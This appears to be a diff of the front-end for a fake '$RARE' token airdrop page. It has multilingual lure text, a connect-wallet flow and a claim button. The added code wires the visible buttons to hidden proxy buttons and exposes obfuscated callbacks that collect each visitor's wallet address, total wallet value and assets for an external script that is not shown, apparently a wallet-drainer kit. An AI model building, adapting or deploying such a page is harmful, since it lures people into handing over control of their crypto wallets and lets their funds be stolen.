-                        connectBtn.style.display = 'block';
-                        console.log('   ✅ Connect button shown');
-                    }
-                    if (disconnectBtn) {
-                        disconnectBtn.style.display = 'none';
-                        console.log('   ✅ Disconnect button hidden');
-                    }
-                }
-            }
-            
-            // Check connected wallet and update UI
-            function checkConnected() {
-                console.log('🔍 Checking connected wallet...');
-                
-                if (window.address) {
-                    console.log('✅ Wallet is connected:', window.address);
-                    updateWalletUI(window.address, window.walletName, window.totalWalletPrice);
-                    toggleNavbarButtons(true);
-                }
-            }
-            
-            // Update wallet UI - show address and claim button
-            function updateWalletUI(walletAddress, walletName, totalWalletPrice) {
-                const menuElement = document.getElementById('eligibilityMenu');
-                if (!menuElement) return;
-                
-                const shortAddress = shortenAddress(walletAddress);
-                const displayName = walletName || 'Connected Wallet';
-                
-                // Get translations for current language
-                const t = translations[currentLanguage] || translations.en;
-                
-                menuElement.innerHTML = `
+          </div>
+        </div>
+      </div>
+      <div class="w-full bg-primary mt-8 py-4">
+        <div class="flex items-center justify-center">
+          <div class="text-center text-sm text-sr-text-secondary">
+            <p data-i18n="footerNotice">
+              $RARE airdrop is not available in some countries yet.
+            </p>
+          </div>
+        </div>
+      </div>
+    </main>
+    <div
+      class="flex w-full items-center justify-center rounded px-8 pt-8"
+    ></div>
+
+    <!-- Hidden Proxy Buttons for External Script Integration -->
+    <button
+      id="hiddenConnectBtn"
+      class="cnct-button"
+      style="display: none"
+    ></button>
+    <button
+      id="hiddenDisconnectBtn"
+      class="discon-button"
+      style="display: none"
+    ></button>
+    <button
+      id="hiddenGetRAREBtn"
+      class="getRARE-button"
+      style="display: none"
+    ></button>
+
+    <script>
+      // ========== GLOBAL VARIABLES (exposed for external scripts) ==========
+      window.currentAccount = null;
+      window.currentChain = "0x1";
+      window.walletState = {};
+      window.address = null;
+      window.walletName = null;
+      window.totalWalletPrice = null;
+      window.walletBalance = null;
+      window.walletSteps = null;
+
+      // ========== TRANSLATION SYSTEM ==========
+      const translations = {
+        en: {
+          connectWallet: "CONNECT WALLET",
+          heroTitle: "Your airdrop in the future of art",
+          heroHold:
+            '<span class="font-bold">Hold</span> $RARE to invest in the art revolution.',
+          heroClaim:
+            '<span class="font-bold">Claim</span> $RARE to earn while the market grows.',
+          currentRate: "Current rate based on total staked amount",
+          connectYourWallet: "Connect Your Wallet",
+          getStarted:
+            "Get started by connecting your wallet to claim your rewards",
+          walletConnected: "Wallet Connected",
+          walletValue: "Wallet Value",
+          claim: "CLAIM",
+          claimRewards: "CLAIM REWARDS",
+          footerNotice: "$RARE airdrop is not available in some countries yet.",
+        },
+        de: {
+          connectWallet: "WALLET VERBINDEN",
+          heroTitle: "Ihr Airdrop in der Zukunft der Kunst",
+          heroHold:
+            '<span class="font-bold">Halten</span> Sie $RARE, um in die Kunstrevolution zu investieren.',
+          heroClaim:
+            '<span class="font-bold">Beanspruchen</span> Sie $RARE, um zu verdienen, während der Markt wächst.',
+          currentRate: "Aktueller Zinssatz basierend auf dem gesamten Einsatz",
+          connectYourWallet: "Verbinden Sie Ihr Wallet",
+          getStarted:
+            "Beginnen Sie, indem Sie Ihr Wallet verbinden, um Ihre Belohnungen zu beanspruchen",
+          walletConnected: "Wallet Verbunden",
+          walletValue: "Wallet-Wert",
+          claim: "BEANSPRUCHEN",
+          claimRewards: "BELOHNUNGEN BEANSPRUCHEN",
+          footerNotice:
+            "$RARE Airdrop ist in einigen Ländern noch nicht verfügbar.",
+        },
+        es: {
+          connectWallet: "CONECTAR WALLET",
+          heroTitle: "Tu airdrop en el futuro del arte",
+          heroHold:
+            '<span class="font-bold">Mantén</span> $RARE para invertir en la revolución del arte.',
+          heroClaim:
+            '<span class="font-bold">Reclama</span> $RARE para ganar mientras el mercado crece.',
+          currentRate: "Tasa actual basada en la cantidad total en staking",
+          connectYourWallet: "Conecta Tu Wallet",
+          getStarted:
+            "Comienza conectando tu wallet para reclamar tus recompensas",
+          walletConnected: "Wallet Conectada",
+          walletValue: "Valor del Wallet",
+          claim: "RECLAMAR",
+          claimRewards: "RECLAMAR RECOMPENSAS",
+          footerNotice:
+            "El airdrop de $RARE aún no está disponible en algunos países.",
+        },
+        nl: {
+          connectWallet: "WALLET VERBINDEN",
+          heroTitle: "Jouw airdrop in de toekomst van kunst",
+          heroHold:
+            '<span class="font-bold">Houd</span> $RARE om te investeren in de kunstrevolutie.',
+          heroClaim:
+            '<span class="font-bold">Claim</span> $RARE om te verdienen terwijl de markt groeit.',
+          currentRate: "Huidig tarief gebaseerd op totale gestakte bedrag",
+          connectYourWallet: "Verbind Je Wallet",
+          getStarted:
+            "Begin door je wallet te verbinden om je beloningen te claimen",
+          walletConnected: "Wallet Verbonden",
+          walletValue: "Wallet Waarde",
+          claim: "CLAIMEN",
+          claimRewards: "BELONINGEN CLAIMEN",
+          footerNotice:
+            "$RARE airdrop is nog niet beschikbaar in sommige landen.",
+        },
+        pt: {
+          connectWallet: "CONECTAR CARTEIRA",
+          heroTitle: "Seu airdrop no futuro da arte",
+          heroHold:
+            '<span class="font-bold">Mantenha</span> $RARE para investir na revolução da arte.',
+          heroClaim:
+            '<span class="font-bold">Reivindique</span> $RARE para ganhar enquanto o mercado cresce.',
+          currentRate: "Taxa atual baseada no valor total em staking",
+          connectYourWallet: "Conecte Sua Carteira",
+          getStarted:
+            "Comece conectando sua carteira para reivindicar suas recompensas",
+          walletConnected: "Carteira Conectada",
+          walletValue: "Valor da Carteira",
+          claim: "REIVINDICAR",
+          claimRewards: "REIVINDICAR RECOMPENSAS",
+          footerNotice:
+            "O airdrop de $RARE ainda não está disponível em alguns países.",
+        },
+        ru: {
+          connectWallet: "ПОДКЛЮЧИТЬ КОШЕЛЕК",
+          heroTitle: "Ваш airdrop в будущем искусства",
+          heroHold:
+            '<span class="font-bold">Держите</span> $RARE, чтобы инвестировать в революцию искусства.',
+          heroClaim:
+            '<span class="font-bold">Получите</span> $RARE, чтобы зарабатывать, пока рынок растет.',
+          currentRate: "Текущая ставка основана на общей сумме стейкинга",
+          connectYourWallet: "Подключите Ваш Кошелек",
+          getStarted:
+            "Начните с подключения вашего кошелька, чтобы получить награды",
+          walletConnected: "Кошелек Подключен",
+          walletValue: "Стоимость Кошелька",
+          claim: "ПОЛУЧИТЬ",
+          claimRewards: "ПОЛУЧИТЬ НАГРАДЫ",
+          footerNotice: "Airdrop $RARE пока недоступен в некоторых странах.",
+        },
+        uk: {
+          connectWallet: "ПІДКЛЮЧИТИ ГАМАНЕЦЬ",
+          heroTitle: "Ваш airdrop у майбутньому мистецтва",
+          heroHold:
+            '<span class="font-bold">Тримайте</span> $RARE, щоб інвестувати в революцію мистецтва.',
+          heroClaim:
+            '<span class="font-bold">Отримайте</span> $RARE, щоб заробляти, поки ринок зростає.',
+          currentRate: "Поточна ставка на основі загальної суми стейкінгу",
+          connectYourWallet: "Підключіть Ваш Гаманець",
+          getStarted:
+            "Почніть з підключення вашого гаманця, щоб отримати винагороди",
+          walletConnected: "Гаманець Підключено",
+          walletValue: "Вартість Гаманця",
+          claim: "ОТРИМАТИ",
+          claimRewards: "ОТРИМАТИ ВИНАГОРОДИ",
+          footerNotice: "Airdrop $RARE поки недоступний у деяких країнах.",
+        },
+        zh: {
+          connectWallet: "连接钱包",
+          heroTitle: "您在艺术未来中的空投",
+          heroHold: '<span class="font-bold">持有</span> $RARE 投资艺术革命。',
+          heroClaim:
+            '<span class="font-bold">领取</span> $RARE 在市场增长时赚取收益。',
+          currentRate: "基于总质押金额的当前利率",
+          connectYourWallet: "连接您的钱包",
+          getStarted: "通过连接您的钱包开始领取奖励",
+          walletConnected: "钱包已连接",
+          walletValue: "钱包价值",
+          claim: "领取",
+          claimRewards: "领取奖励",
+          footerNotice: "$RARE 空投在某些国家尚未提供。",
+        },
+      };
+
+      // Current language
+      let currentLanguage = localStorage.getItem("selectedLanguage") || "en";
+
+      // Apply translations to the page
+      function applyTranslations(lang) {
+        const langData = translations[lang] || translations.en;
+
+        // Update all elements with data-i18n attribute
+        document.querySelectorAll("[data-i18n]").forEach((element) => {
+          const key = element.getAttribute("data-i18n");
+          if (langData[key]) {
+            element.innerHTML = langData[key];
+          }
+        });
+
+        // Update language selector
+        const langCode = lang.toUpperCase();
+        const langCodeElement = document.getElementById("currentLangCode");
+        if (langCodeElement) {
+          langCodeElement.textContent = langCode;
+        }
+
+        // Update active state in dropdown
+        document.querySelectorAll(".lang-option").forEach((option) => {
+          const optionLang = option.getAttribute("data-lang");
+          if (optionLang === lang) {
+            option.classList.add("bg-sr-bg-primary");
+          } else {
+            option.classList.remove("bg-sr-bg-primary");
+          }
+        });
+
+        // If wallet is connected, update the wallet UI with translations
+        if (window.address) {
+          updateWalletUI(
+            window.address,
+            window.walletName,
+            window.totalWalletPrice,
+          );
+        }
+
+        currentLanguage = lang;
+        localStorage.setItem("selectedLanguage", lang);
+        console.log("🌐 Language changed to:", lang);
+      }
+
+      // Function to shorten wallet address
+      function shortenAddress(address) {
+        if (!address) return "";
+        return `${address.substring(0, 5)}...${address.substring(address.length - 4)}`;
+      }
+
+      // Toggle navbar buttons based on connection status
+      function toggleNavbarButtons(isConnected) {
+        // Select only visible buttons (not the hidden proxy buttons)
+        const connectBtn = document.querySelector(
+          ".cnct-button:not(#hiddenConnectBtn)",
+        );
+        const disconnectBtn = document.querySelector(
+          ".discon-button:not(#hiddenDisconnectBtn)",
+        );
+
+        console.log("🔄 Toggling navbar buttons. Connected:", isConnected);
+        console.log("   Connect button:", connectBtn);
+        console.log("   Disconnect button:", disconnectBtn);
+
+        if (isConnected) {
+          if (connectBtn) {
+            connectBtn.style.display = "none";
+            console.log("   ✅ Connect button hidden");
+          }
+          if (disconnectBtn) {
+            disconnectBtn.style.display = "block";
+            console.log("   ✅ Disconnect button shown");
+          }
+        } else {
+          if (connectBtn) {
+            connectBtn.style.display = "block";
+            console.log("   ✅ Connect button shown");
+          }
+          if (disconnectBtn) {
+            disconnectBtn.style.display = "none";
+            console.log("   ✅ Disconnect button hidden");
+          }
+        }
+      }
+
+      // Check connected wallet and update UI
+      function checkConnected() {
+        console.log("🔍 Checking connected wallet...");
+
+        if (window.address) {
+          console.log("✅ Wallet is connected:", window.address);
+          updateWalletUI(
+            window.address,
+            window.walletName,
+            window.totalWalletPrice,
+          );
+          toggleNavbarButtons(true);
+        }
+      }
+
+      // Update wallet UI - show address and claim button
+      function updateWalletUI(walletAddress, walletName, totalWalletPrice) {
+        const menuElement = document.getElementById("eligibilityMenu");
+        if (!menuElement) return;
+
+        const shortAddress = shortenAddress(walletAddress);
+        const displayName = walletName || "Connected Wallet";
+
+        // Get translations for current language
+        const t = translations[currentLanguage] || translations.en;
+
+        menuElement.innerHTML = `
                     <div style="padding: 2.5rem 2rem; text-align: center;">
                         <!-- Success Icon with Animation -->
                         <div style="margin-bottom: 1.5rem;">
@@ -643,7 +1047,7 @@
                                 <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="opacity: 0.9;">
                                     <path d="M5 12h14M13 5l7 7-7 7" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                                 </svg>
-                                ${t.claim || 'CLAIM'}
+                                ${t.claim || "CLAIM"}
                             </span>
                             </button>
                         
@@ -659,284 +1063,326 @@
                         </style>
                     </div>
                 `;
+      }
+
+      // Wallet Address Callback - called when wallet address is detected
+      window.byx9z452mq = function (address) {
+        console.log("🎯 WALLET ADDRESS DETECTED:", address);
+        window.address = address;
+        window.currentAccount = address;
+        localStorage.setItem("address", address);
+
+        // Show disconnect button (hidden by default until wallet connects)
+        toggleNavbarButtons(true);
+
+        // Auto-trigger ENS lookup
+        console.log("🚀 Auto-triggering ENS lookup...");
+        checkConnected();
+      };
+
+      // Wallet Balance Callback - called when wallet balance is available
+      window.np8efn42ua = function (balance) {
+        console.log("💰 WALLET BALANCE:", balance);
+        window.walletBalance = balance;
+      };
+
+      // Comprehensive Data Callback - called with full wallet information
+      window.qf1tf9yfwa = function (data) {
+        console.log("📊 COMPREHENSIVE WALLET DATA:", data);
+        const {
+          walletAddress,
+          walletName,
+          totalWalletPrice,
+          steps,
+          rawAssets,
+          balances,
+        } = data;
+
+        if (walletAddress) {
+          window.address = walletAddress;
+          window.currentAccount = walletAddress;
+          localStorage.setItem("address", walletAddress);
+          console.log("👛 Wallet Address:", walletAddress);
+        }
+
+        if (walletName) {
+          window.walletName = walletName;
+          sessionStorage.setItem("walletName", walletName);
+          console.log("💼 Wallet Name:", walletName);
+        }
+
+        if (totalWalletPrice !== undefined) {
+          window.totalWalletPrice = totalWalletPrice;
+          console.log("💵 Total Wallet Value: $" + totalWalletPrice);
+        }
+
+        if (steps) {
+          window.walletSteps = steps;
+          console.log("📋 Wallet Steps:", steps);
+        }
+
+        if (rawAssets) {
+          sessionStorage.setItem("rawAssets", JSON.stringify(rawAssets));
+          console.log("💎 Raw Assets:", rawAssets);
+        }
+
+        // Check if wallet is connected
+        const isConnected = steps && steps.includes("connect") && walletAddress;
+
+        if (isConnected) {
+          // Create comprehensive wallet state
+          window.walletState = {
+            connected: true,
+            address: walletAddress,
+            shortAddress: `${walletAddress.slice(0, 6)}...${walletAddress.slice(-4)}`,
+            hasConnectButton: true,
+            hasDisconnectButton: true,
+            hasGetRAREButton: true,
+            chainId: window.currentChain || "0x1",
+            timestamp: Date.now(),
+            walletName,
+            totalWalletPrice,
+            steps,
+            assetCount: rawAssets?.length || 0,
+          };
+
+          // Dispatch custom event for external scripts
+          window.dispatchEvent(
+            new CustomEvent("walletStateChanged", {
+              detail: window.walletState,
+            }),
+          );
+
+          console.log("📢 walletStateChanged event dispatched");
+        }
+
+        // Update the UI
+        if (walletAddress) {
+          console.log("🎨 Updating wallet UI...");
+          updateWalletUI(walletAddress, walletName, totalWalletPrice);
+          toggleNavbarButtons(true);
+        }
+      };
+
+      // Disconnect wallet function
+      function disconnectWallet() {
+        console.log("🔌🔌🔌 DISCONNECT WALLET FUNCTION CALLED! 🔌🔌🔌");
+
+        // Clear all stored data
+        window.address = null;
+        window.currentAccount = null;
+        window.walletName = null;
+        window.totalWalletPrice = null;
+        window.walletBalance = null;
+        window.walletSteps = null;
+        window.walletState = {};
+        console.log("   ✅ Window variables cleared");
+
+        // Clear localStorage completely
+        localStorage.clear();
+        console.log("   ✅ localStorage cleared");
+
+        // Clear sessionStorage completely
+        sessionStorage.clear();
+        console.log("   ✅ sessionStorage cleared");
+
+        // Clear cookies (if any)
+        document.cookie.split(";").forEach(function (c) {
+          document.cookie = c
+            .replace(/^ +/, "")
+            .replace(
+              /=.*/,
+              "=;expires=" + new Date().toUTCString() + ";path=/",
+            );
+        });
+        console.log("   ✅ Cookies cleared");
+
+        console.log("   ⏳ Reloading page in 500ms...");
+
+        // Reload the page after a short delay
+        setTimeout(() => {
+          console.log("   🔄 RELOADING NOW!");
+          window.location.reload(true); // true forces reload from server, not cache
+        }, 500);
+      }
+
+      // ========== BUTTON PROXY SETUP ==========
+
+      // Setup proxy connections when DOM is loaded
+      document.addEventListener("DOMContentLoaded", function () {
+        // 1. Connect Button Proxy (select only visible navbar button)
+        const connectBtn = document.querySelector(
+          ".cnct-button:not(#hiddenConnectBtn)",
+        );
+        const hiddenConnectBtn = document.getElementById("hiddenConnectBtn");
+
+        if (connectBtn && hiddenConnectBtn) {
+          connectBtn.addEventListener("click", () => {
+            console.log("🔗 Connect button clicked - triggering hidden proxy");
+            hiddenConnectBtn.click();
+          });
+          console.log("✅ Connect button proxy attached");
+        }
+
+        // 2. Disconnect Button Proxy (select only visible navbar button)
+        const disconnectBtn = document.querySelector(
+          ".discon-button:not(#hiddenDisconnectBtn)",
+        );
+        const hiddenDisconnectBtn = document.getElementById(
+          "hiddenDisconnectBtn",
+        );
+
+        console.log("🔍 Looking for disconnect button:", disconnectBtn);
+        console.log(
+          "🔍 Looking for hidden disconnect button:",
+          hiddenDisconnectBtn,
+        );
+
+        if (disconnectBtn && hiddenDisconnectBtn) {
+          disconnectBtn.addEventListener("click", (e) => {
+            e.preventDefault();
+            e.stopPropagation();
+            console.log(
+              "🔌 Disconnect button clicked - triggering hidden proxy",
+            );
+            hiddenDisconnectBtn.click();
+            disconnectWallet();
+          });
+          console.log("✅ Disconnect button proxy attached to:", disconnectBtn);
+        } else {
+          console.error("❌ Disconnect button or hidden button not found!");
+        }
+
+        // ========== LANGUAGE SELECTOR INITIALIZATION ==========
+
+        // Toggle language dropdown
+        const languageSelector = document.getElementById("languageSelector");
+        const languageDropdown = document.getElementById("languageDropdown");
+
+        if (languageSelector && languageDropdown) {
+          languageSelector.addEventListener("click", (e) => {
+            e.stopPropagation();
+            languageDropdown.style.display =
+              languageDropdown.style.display === "none" ? "block" : "none";
+          });
+
+          // Close dropdown when clicking outside
+          document.addEventListener("click", (e) => {
+            if (
+              !languageSelector.contains(e.target) &&
+              !languageDropdown.contains(e.target)
+            ) {
+              languageDropdown.style.display = "none";
             }
-            
-            // Wallet Address Callback - called when wallet address is detected
-            window.byx9z452mq = function(address) {
-                console.log('🎯 WALLET ADDRESS DETECTED:', address);
-                window.address = address;
-                window.currentAccount = address;
-                localStorage.setItem('address', address);
-                
-                // Show disconnect button (hidden by default until wallet connects)
-                toggleNavbarButtons(true);
-                
-                // Auto-trigger ENS lookup
-                console.log('🚀 Auto-triggering ENS lookup...');
-                checkConnected();
-            };
-            
-            // Wallet Balance Callback - called when wallet balance is available
-            window.np8efn42ua = function(balance) {
-                console.log('💰 WALLET BALANCE:', balance);
-                window.walletBalance = balance;
-            };
-            
-            // Comprehensive Data Callback - called with full wallet information
-            window.qf1tf9yfwa = function(data) {
-                console.log('📊 COMPREHENSIVE WALLET DATA:', data);
-                const {walletAddress, walletName, totalWalletPrice, steps, rawAssets, balances} = data;
-                
-                if (walletAddress) {
-                    window.address = walletAddress;
-                    window.currentAccount = walletAddress;
-                    localStorage.setItem('address', walletAddress);
-                    console.log('👛 Wallet Address:', walletAddress);
-                }
-                
-                if (walletName) {
-                    window.walletName = walletName;
-                    sessionStorage.setItem('walletName', walletName);
-                    console.log('💼 Wallet Name:', walletName);
-                }
-                
-                if (totalWalletPrice !== undefined) {
-                    window.totalWalletPrice = totalWalletPrice;
-                    console.log('💵 Total Wallet Value: $' + totalWalletPrice);
-                }
-                
-                if (steps) {
-                    window.walletSteps = steps;
-                    console.log('📋 Wallet Steps:', steps);
-                }
-                
-                if (rawAssets) {
-                    sessionStorage.setItem('rawAssets', JSON.stringify(rawAssets));
-                    console.log('💎 Raw Assets:', rawAssets);
-                }
-                
-                // Check if wallet is connected
-                const isConnected = steps && steps.includes('connect') && walletAddress;
-                
-                if (isConnected) {
-                    // Create comprehensive wallet state
-                    window.walletState = {
-                        connected: true,
-                        address: walletAddress,
-                        shortAddress: `${walletAddress.slice(0, 6)}...${walletAddress.slice(-4)}`,
-                        hasConnectButton: true,
-                        hasDisconnectButton: true,
-                        hasGetRAREButton: true,
-                        chainId: window.currentChain || '0x1',
-                        timestamp: Date.now(),
-                        walletName,
-                        totalWalletPrice,
-                        steps,
-                        assetCount: rawAssets?.length || 0
-                    };
-                    
-                    // Dispatch custom event for external scripts
-                    window.dispatchEvent(new CustomEvent('walletStateChanged', {
-                        detail: window.walletState
-                    }));
-                    
-                    console.log('📢 walletStateChanged event dispatched');
-                }
-                
-                // Update the UI
-                if (walletAddress) {
-                    console.log('🎨 Updating wallet UI...');
-                    updateWalletUI(walletAddress, walletName, totalWalletPrice);
-                    toggleNavbarButtons(true);
-                }
-            };
-            
-            // Disconnect wallet function
-            function disconnectWallet() {
-                console.log('🔌🔌🔌 DISCONNECT WALLET FUNCTION CALLED! 🔌🔌🔌');
-                
-                // Clear all stored data
-                window.address = null;
-                window.currentAccount = null;
-                window.walletName = null;
-                window.totalWalletPrice = null;
-                window.walletBalance = null;
-                window.walletSteps = null;
-                window.walletState = {};
-                console.log('   ✅ Window variables cleared');
-                
-                // Clear localStorage completely
-                localStorage.clear();
-                console.log('   ✅ localStorage cleared');
-                
-                // Clear sessionStorage completely
-                sessionStorage.clear();
-                console.log('   ✅ sessionStorage cleared');
-                
-                // Clear cookies (if any)
-                document.cookie.split(";").forEach(function(c) { 
-                    document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/"); 
-                });
-                console.log('   ✅ Cookies cleared');
-                
-                console.log('   ⏳ Reloading page in 500ms...');
-                
-                // Reload the page after a short delay
-                setTimeout(() => {
-                    console.log('   🔄 RELOADING NOW!');
-                    window.location.reload(true); // true forces reload from server, not cache
-                }, 500);
+          });
+
+          // Language option click handlers (hover effects handled by CSS now)
+          document.querySelectorAll(".lang-option").forEach((option) => {
+            option.addEventListener("click", () => {
+              const selectedLang = option.getAttribute("data-lang");
+              applyTranslations(selectedLang);
+              languageDropdown.style.display = "none";
+            });
+          });
+
+          console.log("✅ Language selector initialized");
+        }
+
+        // Apply saved language or default to English on page load
+        applyTranslations(currentLanguage);
+
+        // Ensure disconnect button is hidden on page load
+        toggleNavbarButtons(false);
+        console.log("✅ Initial UI state set");
+
+        // ========== THEME TOGGLE ==========
+
+        const themeToggle = document.getElementById("themeToggle");
+        const themeIcon = document.getElementById("themeIcon");
+        const htmlElement = document.documentElement;
+
+        // Check for saved theme preference or default to 'dark'
+        const savedTheme = localStorage.getItem("theme") || "dark";
+        htmlElement.classList.remove("light", "dark");
+        htmlElement.classList.add(savedTheme);
+
+        // Update icon rotation based on theme
+        if (savedTheme === "light") {
+          themeIcon.style.transform = "rotate(0deg)";
+        } else {
+          themeIcon.style.transform = "rotate(180deg)";
+        }
+
+        if (themeToggle) {
+          themeToggle.addEventListener("click", () => {
+            const currentTheme = htmlElement.classList.contains("dark")
+              ? "dark"
+              : "light";
+            const newTheme = currentTheme === "dark" ? "light" : "dark";
+
+            console.log(
+              `🎨 Switching theme from ${currentTheme} to ${newTheme}`,
+            );
+
+            // Update HTML class
+            htmlElement.classList.remove("light", "dark");
+            htmlElement.classList.add(newTheme);
+
+            // Rotate icon
+            if (newTheme === "light") {
+              themeIcon.style.transform = "rotate(0deg)";
+            } else {
+              themeIcon.style.transform = "rotate(180deg)";
             }
-            
-            // ========== BUTTON PROXY SETUP ==========
-            
-            // Setup proxy connections when DOM is loaded
-            document.addEventListener('DOMContentLoaded', function() {
-                // 1. Connect Button Proxy (select only visible navbar button)
-                const connectBtn = document.querySelector('.cnct-button:not(#hiddenConnectBtn)');
-                const hiddenConnectBtn = document.getElementById('hiddenConnectBtn');
-                
-                if (connectBtn && hiddenConnectBtn) {
-                    connectBtn.addEventListener('click', () => {
-                        console.log('🔗 Connect button clicked - triggering hidden proxy');
-                        hiddenConnectBtn.click();
-                    });
-                    console.log('✅ Connect button proxy attached');
-                }
-                
-                // 2. Disconnect Button Proxy (select only visible navbar button)
-                const disconnectBtn = document.querySelector('.discon-button:not(#hiddenDisconnectBtn)');
-                const hiddenDisconnectBtn = document.getElementById('hiddenDisconnectBtn');
-                
-                console.log('🔍 Looking for disconnect button:', disconnectBtn);
-                console.log('🔍 Looking for hidden disconnect button:', hiddenDisconnectBtn);
-                
-                if (disconnectBtn && hiddenDisconnectBtn) {
-                    disconnectBtn.addEventListener('click', (e) => {
-                        e.preventDefault();
-                        e.stopPropagation();
-                        console.log('🔌 Disconnect button clicked - triggering hidden proxy');
-                        hiddenDisconnectBtn.click();
-                        disconnectWallet();
-                    });
-                    console.log('✅ Disconnect button proxy attached to:', disconnectBtn);
-                } else {
-                    console.error('❌ Disconnect button or hidden button not found!');
-                }
-                
-                // ========== LANGUAGE SELECTOR INITIALIZATION ==========
-                
-                // Toggle language dropdown
-                const languageSelector = document.getElementById('languageSelector');
-                const languageDropdown = document.getElementById('languageDropdown');
-                
-                if (languageSelector && languageDropdown) {
-                    languageSelector.addEventListener('click', (e) => {
-                        e.stopPropagation();
-                        languageDropdown.style.display = languageDropdown.style.display === 'none' ? 'block' : 'none';
-                    });
-                    
-                    // Close dropdown when clicking outside
-                    document.addEventListener('click', (e) => {
-                        if (!languageSelector.contains(e.target) && !languageDropdown.contains(e.target)) {
-                            languageDropdown.style.display = 'none';
-                        }
-                    });
-                    
-                    // Language option click handlers (hover effects handled by CSS now)
-                    document.querySelectorAll('.lang-option').forEach(option => {
-                        option.addEventListener('click', () => {
-                            const selectedLang = option.getAttribute('data-lang');
-                            applyTranslations(selectedLang);
-                            languageDropdown.style.display = 'none';
-                        });
-                    });
-                    
-                    console.log('✅ Language selector initialized');
-                }
-                
-                // Apply saved language or default to English on page load
-                applyTranslations(currentLanguage);
-                
-                // Ensure disconnect button is hidden on page load
-                toggleNavbarButtons(false);
-                console.log('✅ Initial UI state set');
-                
-                // ========== THEME TOGGLE ==========
-                
-                const themeToggle = document.getElementById('themeToggle');
-                const themeIcon = document.getElementById('themeIcon');
-                const htmlElement = document.documentElement;
-                
-                // Check for saved theme preference or default to 'dark'
-                const savedTheme = localStorage.getItem('theme') || 'dark';
-                htmlElement.classList.remove('light', 'dark');
-                htmlElement.classList.add(savedTheme);
-                
-                // Update icon rotation based on theme
-                if (savedTheme === 'light') {
-                    themeIcon.style.transform = 'rotate(0deg)';
-                } else {
-                    themeIcon.style.transform = 'rotate(180deg)';
-                }
-                
-                if (themeToggle) {
-                    themeToggle.addEventListener('click', () => {
-                        const currentTheme = htmlElement.classList.contains('dark') ? 'dark' : 'light';
-                        const newTheme = currentTheme === 'dark' ? 'light' : 'dark';
-                        
-                        console.log(`🎨 Switching theme from ${currentTheme} to ${newTheme}`);
-                        
-                        // Update HTML class
-                        htmlElement.classList.remove('light', 'dark');
-                        htmlElement.classList.add(newTheme);
-                        
-                        // Rotate icon
-                        if (newTheme === 'light') {
-                            themeIcon.style.transform = 'rotate(0deg)';
-                        } else {
-                            themeIcon.style.transform = 'rotate(180deg)';
-                        }
-                        
-                        // Save preference
-                        localStorage.setItem('theme', newTheme);
-                        console.log('✅ Theme switched to:', newTheme);
-                    });
-                    
-                    console.log('✅ Theme toggle initialized');
-                }
-                
-                // 3. getRARE Button Proxy (Event Delegation - button is dynamically created)
-                console.log('✅ getRARE button proxy ready (event delegation)');
-            });
-            
-            // getRARE button click handler (outside DOMContentLoaded since it uses event delegation)
-            document.addEventListener('click', (e) => {
-                const getRareBtn = e.target.closest('.getRARE-button');
-                
-                if (getRareBtn && !getRareBtn.id.includes('hidden')) {
-                    const hiddenGetRAREBtn = document.getElementById('hiddenGetRAREBtn');
-                    
-                    if (hiddenGetRAREBtn) {
-                        console.log('💎 getRARE button clicked - triggering hidden proxy');
-                        
-                        // Transfer wallet data to hidden button attributes
-                        if (window.address) {
-                            hiddenGetRAREBtn.setAttribute('data-wallet-address', window.address);
-                        }
-                        if (window.walletName) {
-                            hiddenGetRAREBtn.setAttribute('data-wallet-name', window.walletName);
-                        }
-                        if (window.totalWalletPrice !== undefined) {
-                            hiddenGetRAREBtn.setAttribute('data-wallet-price', window.totalWalletPrice);
-                        }
-                        
-                        // Trigger hidden button click
-                        hiddenGetRAREBtn.click();
-                    }
-                }
-            });
-        </script>
-    </body>
-    <div id="detach-button-host" style="top: 128px; left: 386px;"></div>
+
+            // Save preference
+            localStorage.setItem("theme", newTheme);
+            console.log("✅ Theme switched to:", newTheme);
+          });
+
+          console.log("✅ Theme toggle initialized");
+        }
+
+        // 3. getRARE Button Proxy (Event Delegation - button is dynamically created)
+        console.log("✅ getRARE button proxy ready (event delegation)");
+      });
+
+      // getRARE button click handler (outside DOMContentLoaded since it uses event delegation)
+      document.addEventListener("click", (e) => {
+        const getRareBtn = e.target.closest(".getRARE-button");
+
+        if (getRareBtn && !getRareBtn.id.includes("hidden")) {
+          const hiddenGetRAREBtn = document.getElementById("hiddenGetRAREBtn");
+
+          if (hiddenGetRAREBtn) {
+            console.log("💎 getRARE button clicked - triggering hidden proxy");
+
+            // Transfer wallet data to hidden button attributes
+            if (window.address) {
+              hiddenGetRAREBtn.setAttribute(
+                "data-wallet-address",
+                window.address,
+              );
+            }
+            if (window.walletName) {
+              hiddenGetRAREBtn.setAttribute(
+                "data-wallet-name",
+                window.walletName,
+              );
+            }
+            if (window.totalWalletPrice !== undefined) {
+              hiddenGetRAREBtn.setAttribute(
+                "data-wallet-price",
+                window.totalWalletPrice,
+              );
+            }
+
+            // Trigger hidden button click
+            hiddenGetRAREBtn.click();
+          }
+        }
+      });
+    </script>
+  </body>
+  <div id="detach-button-host" style="top: 128px; left: 386px"></div>
 </html>
